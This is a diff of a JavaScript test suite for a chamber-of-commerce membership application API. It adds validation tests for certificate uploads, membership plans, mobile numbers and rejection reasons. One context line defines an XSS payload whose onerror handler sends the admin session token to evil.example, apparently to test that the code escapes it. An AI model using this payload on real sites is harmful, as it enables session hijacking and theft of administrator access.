@@ -112,13 +112,28 @@ section('BUG-01  Submitted applications are visible to the admin');
 
 const XSS = '<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bcci_admin_session)">';
 
+// 1px PNG — passes the backend's magic-byte file signature check.
+const TINY_PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
+
 const validApp = (overrides = {}) => ({
+  fullName: 'Rajesh Shah',
+  subject: 'BCCI Membership Form',
+  city: 'Bharuch',
+  state: 'Gujarat',
   repName: 'Rajesh Shah',
   repDesignation: 'Director',
+  repMobile: '9876543211',
+  repEmail: 'rep@shahchemicals.example',
   company: 'Shah Chemicals Ltd',
   legalStatus: 'Private Limited',
   enterpriseType: 'Medium',
   businessServices: 'Chemicals',
+  primaryBusiness: 'Shah Chemicals',
+  businessDescription: 'Manufacturing industrial solvents for ten years.',
+  website: 'https://shahchemicals.example',
+  feedback: 'Happy to join the chamber.',
+  membershipPlan: 'Medium - ₹1,000 / Year',
+  paymentMode: 'UPI',
   annualTurnover: '50000000',
   employees: '50',
   phone: '9876543210',
@@ -126,6 +141,8 @@ const validApp = (overrides = {}) => ({
   district: 'Bharuch',
   pincode: '392001',
   paymentRef: 'UPI/123456789012',
+  gstCertProof: TINY_PNG,
+  panCertProof: TINY_PNG,
   ...overrides,
 });
 
@@ -230,6 +247,36 @@ r = await call(applications, {
 check('POST with no payment proof or reference → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.31',
+  body: validApp({ gstCertProof: '' }),
+});
+check('POST without GST certificate → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.32',
+  body: validApp({ panCertProof: 'data:image/png;base64,bm90LXJlYWw=' }),
+});
+check('POST with spoofed PAN certificate → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.33',
+  body: validApp({ membershipPlan: 'Gold - ₹999 / Year' }),
+});
+check('POST with unknown membership plan → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.34',
+  body: validApp({ repMobile: '123' }),
+});
+check('POST with invalid representative mobile → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.35',
+  body: validApp({ businessDescription: 'Too short' }),
+});
+check('POST with short business description → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.29',
   body: validApp({ paymentProof: 'data:text/plain;base64,bm90LXJlYWw=' }),
 });
@@ -256,6 +303,27 @@ check('applicant cannot approve their own application', r.statusCode === 401, `g
 r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, status: 'Approved' } });
 check('admin approves → 200, status Approved', r.statusCode === 200 && r.body?.application?.status === 'Approved', JSON.stringify(r.body).slice(0, 200));
 check('approvedAt is recorded', !!r.body?.application?.approvedAt);
+
+// Rejection with a reason: persisted on the record, not just emailed
+await call(sendOtp, { method: 'POST', ip: '203.0.113.77', body: { email: 'reject@example.com' } });
+const otp2 = JSON.parse(mock.store.get('bcci:otp:reject@example.com'));
+r = await call(verifyOtp, { method: 'POST', ip: '203.0.113.77', body: { email: 'reject@example.com', code: otp2, name: 'Nita Rao' } });
+const rejectToken = r.body?.session?.token;
+check('second applicant verifies → 200 with a session token', r.statusCode === 200 && !!rejectToken, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: rejectToken, ip: '203.0.113.78',
+  body: validApp({ company: 'Rao Foods', repName: 'Nita Rao', gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' }),
+});
+check('second application submits → 201', r.statusCode === 201, `got ${r.statusCode}`);
+const rejectAppId = r.body?.applicationId;
+
+r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, status: 'Rejected', reason: 'Invalid GSTIN document' } });
+check('admin rejects with a reason → 200, status Rejected', r.statusCode === 200 && r.body?.application?.status === 'Rejected', `got ${r.statusCode}`);
+check('rejection reason is persisted on the record', r.body?.application?.rejectionReason === 'Invalid GSTIN document', JSON.stringify(r.body?.application?.rejectionReason));
+
+r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, status: 'Approved' } });
+check('re-approving clears the stale rejection reason', r.statusCode === 200 && r.body?.application?.rejectionReason === undefined, JSON.stringify(r.body?.application?.rejectionReason));
 
 r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/12345' } });
 check('member requests renewal → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
@@ -369,7 +437,7 @@ check('no token → 401', r.statusCode === 401, `got ${r.statusCode}`);
 
 r = await call(adminStats, { method: 'GET', token: adminToken });
 check('valid admin token → 200 (was always 401 before)', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
-check('counts the approved member', r.body?.stats?.approved === 1, `got ${r.body?.stats?.approved}`);
+check('counts the approved members (original + re-approved rejection test)', r.body?.stats?.approved === 2, `got ${r.body?.stats?.approved}`);
 
 // ════════════════════════════════════════════════════════════════════
 section('SEC-03  The email endpoint is no longer an open relay');
